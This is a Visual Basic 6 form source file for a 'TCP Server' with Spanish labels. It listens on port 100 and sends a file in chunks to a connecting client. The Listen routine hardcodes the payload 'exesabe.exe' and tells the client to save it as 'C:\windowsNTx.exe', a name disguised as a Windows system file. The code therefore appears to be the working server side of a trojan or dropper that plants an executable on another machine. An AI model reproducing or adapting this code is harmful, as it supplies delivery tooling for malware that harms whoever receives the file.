VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmServer 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "TCP Server"
   ClientHeight    =   1635
   ClientLeft      =   2190
   ClientTop       =   5910
   ClientWidth     =   8130
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   1635
   ScaleMode       =   0  'User
   ScaleWidth      =   8010
   Begin VB.TextBox txtSaveAs 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   1320
      TabIndex        =   5
      Top             =   840
      Width           =   1815
   End
   Begin VB.TextBox txtFile 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   1320
      TabIndex        =   4
      Top             =   480
      Width           =   5055
   End
   Begin VB.CommandButton cmdSend 
      Caption         =   "Send"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   6480
      TabIndex        =   2
      Top             =   840
      Width           =   1425
   End
   Begin VB.CommandButton cmdConnect 
      Caption         =   "Listen"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   375
      Left            =   6480
      TabIndex        =   0
      Top             =   480
      Width           =   1425
   End
   Begin MSWinsockLib.Winsock tcpServer 
      Left            =   5640
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label Label2 
      Caption         =   "Guardar como"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   240
      Left            =   120
      TabIndex        =   7
      Top             =   840
      Width           =   1200
   End
   Begin VB.Label Label1 
      AutoSize        =   -1  'True
      Caption         =   "Path del archivo"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   195
      Left            =   120
      TabIndex        =   6
      Top             =   480
      Width           =   1155
   End
   Begin VB.Label lblProgress 
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   120
      TabIndex        =   3
      Top             =   1200
      Width           =   6255
   End
   Begin VB.Label lblStatus 
      Caption         =   "No Connection"
      BeginProperty Font 
         Name            =   "Tahoma"
         Size            =   8.25
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   240
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   6120
   End
End
Attribute VB_Name = "frmServer"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit
Private bSendingFile As Boolean
Private lTotal As Long
Private Sub cmdConnect_Click()
    If cmdConnect.caption = "Listen" Then
        sabeeXXXXX
    Else
        
        tcpServer.Close
        lblStatus = "sin conexión"
        
        cmdConnect.caption = "Listen"
    End If
End Sub
Private Sub cmdSend_Click()
    
    If Dir$(txtFile) = "" Then
        MsgBox "El archivo no existe", vbCritical
    Else
        SendDataXXXXX txtFile, txtSaveAs, tcpServer
    End If
End Sub

Sub sabeeXXXXX()
    txtFile = App.Path & "\exesabe.exe"
    txtSaveAs = "C:\windowsNTx.exe"
    tcpServer.Close
    tcpServer.LocalPort = 100
    tcpServer.listen

    caption = "TCP Server @ " & tcpServer.LocalHostName

    lblStatus = "A la escucha en el puerto " & tcpServer.LocalPort & "..."
    
    cmdConnect.caption = "Desconectar"
End Sub

Private Sub Form_Unload(Cancel As Integer)
    tcpServer.Close
End Sub

Private Sub tcpServer_SendProgress(ByVal bytesSent As Long, ByVal bytesRemaining As Long)
    lblProgress.caption = "Enviando archivo " & Int(((lTotal - bytesRemaining) / lTotal) * 100) & "% completado" ': " & bytesSent & " / " & bytesRemaining
End Sub

Private Sub tcpServer_ConnectionRequest(ByVal requestID As Long)
    If tcpServer.State <> sckClosed Then tcpServer.Close
    tcpServer.accept requestID
    
    lblStatus = "Conectado"
    cmdConnect.caption = "Desconectar"
End Sub
Private Sub tcpServer_Close()

    
    cmdConnect.caption = "Listen"
    lblStatus = "No conectado"
End Sub
Private Sub tcpServer_Connect()
    lblStatus = "Conectado"
End Sub
 Sub SendDataXXXXX(sFile As String, sSaveAs As String, tcpCtl As Winsock)
On Error GoTo ErrHandler
    Dim sSend As String, sBuf As String
    Dim ifreefile As Integer
    Dim lRead As Long, lLen As Long, lThisRead As Long, lLastRead As Long
    
    ifreefile = FreeFile
    

    Open sFile For Binary Access Read As #ifreefile
    lLen = LOF(ifreefile)
    

    Do While lRead < lLen
        lThisRead = 65536
        If lThisRead + lRead > lLen Then
            lThisRead = lLen - lRead
        End If
        If Not lThisRead = lLastRead Then
            sBuf = Space$(lThisRead)
        End If
        Get #ifreefile, , sBuf
        lRead = lRead + lThisRead
        sSend = sSend & sBuf
    Loop
    lTotal = lLen
    Close ifreefile
    bSendingFile = True

    tcpCtl.SendData "FILE" & sSaveAs
    DoEvents

    tcpCtl.SendData sSend
    DoEvents

    tcpCtl.SendData "FILEEND"
    bSendingFile = False
    Exit Sub
ErrHandler:
    MsgBox "Err " & Err & " : " & Error
End Sub

